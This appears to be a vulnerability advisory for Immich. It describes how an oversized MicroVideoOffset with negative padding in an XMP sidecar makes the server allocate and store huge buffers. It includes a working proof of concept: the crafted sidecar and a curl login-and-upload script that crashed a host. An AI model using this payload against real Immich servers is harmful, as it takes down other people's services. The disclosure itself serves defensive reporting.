repo.description:
### Summary

An authenticated, non-admin user can upload a JPEG with an XMP sidecar that claims the image contains an oversized motion-photo video. Negative padding makes Immich’s read position valid, but the server still allocates memory based on the unchecked  video length. It then saves the full buffer as a hidden video asset, amplifying a 20.9 KiB upload into 128 MiB of storage and about 480 MiB of server memory use in testing. Using larger values caused the host VM to crash.

### Details

An authenticated, non-admin user can upload a 20.9 KiB JPEG with a crafted XMP sidecar. MicroVideoOffset=2147483647 makes Immich treat the video as nearly 2 GiB long. Negative container padding (-2147462747) makes the calculated read position zero, but Immich does not check that the claimed video length fits inside the JPEG. Immich allocates a buffer for the claimed length, then saves it as a hidden video asset.

In metadata.service.ts (immich-3.3.5/server/src/services/metadata.service.ts:696), Immich takes numeric MicroVideoOffset from the metadata as the video length. It calculates the read position as image size − length − padding, without checking that the requested range fits inside the image. A crafted negative ContainerDirectory.Item.Padding can make that position valid, while leaving the oversized length unchanged. Immich then allocates a buffer of that length with Buffer.alloc().

### Proof of concept

1-Deploy Immich and create a non-admin user account.
2-Create a dummy JPEG with size of 310 bytes. The size of it could also be something else as long as position (position = image size - offset - padding) is equal to 0.
3-Create the following sidecar:
<?xpacket begin="﻿" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="immich-audit">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
    xmlns:Camera="http://ns.google.com/photos/1.0/camera/"
    xmlns:Container="http://ns.google.com/photos/1.0/container/"
    xmlns:Item="http://ns.google.com/photos/1.0/container/item/">
    <rdf:Description rdf:about=""
      Camera:MotionPhoto="1"
      Camera:MicroVideo="1"
      Camera:MicroVideoOffset="2147483647">
      <Container:Directory>
        <rdf:Seq>
          <rdf:li rdf:parseType="Resource">
            <Container:Item Item:Mime="image/jpeg" Item:Semantic="Primary" Item:Length="0" />
          </rdf:li>
          <rdf:li rdf:parseType="Resource">
            <Container:Item Item:Mime="video/mp4" Item:Semantic="MotionPhoto" Item:Length="1" Item:Padding="-2147483337" />
          </rdf:li>
        </rdf:Seq>
      </Container:Directory>
    </rdf:Description>
  </rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
4-Send the following request:
set -o pipefail
API='API LINK HERE'
EMAIL='NON-ADMIN USER ACCOUNT EMAIL'

read -r -s -p 'Password: ' IMMICH_PASSWORD
printf '\n'

TOKEN="$(jq -n --arg email "$EMAIL" --arg password "$IMMICH_PASSWORD" \
  '{email:$email,password:$password}' |
  curl -fsS "$API/auth/login" \
    -H 'Content-Type: application/json' \
    --data-binary @- |
  jq -r '.accessToken')"
unset IMMICH_PASSWORD

STAMP="$(date -u +'%Y-%m-%dT%H:%M:%S.000Z')"
curl -fsS "$API/assets" \
  -H "Authorization: Bearer $TOKEN" \
  -F 'assetData=@motionphoto-finding-poc/dummy-image-2gb.jpg;type=image/jpeg' \
  -F 'sidecarData=@motionphoto-finding-poc/dummy-image-2gb.jpg.xmp;filename=dummy-image-2gb.jpg.xmp;type=application/rdf+xml' \
  -F "fileCreatedAt=$STAMP" \
  -F "fileModifiedAt=$STAMP" \
  -F 'filename=dummy-image-2gb.jpg'

unset TOKEN

Dont forget to change the file names. You should be able to monitor memory usage. I managed to cause a crash with 2GBs. 

### Impact

An attacker with a normal user account can cause the host to go down.
repo.summary: Unbounded motion-photo offset causes memory and disk exhaustion
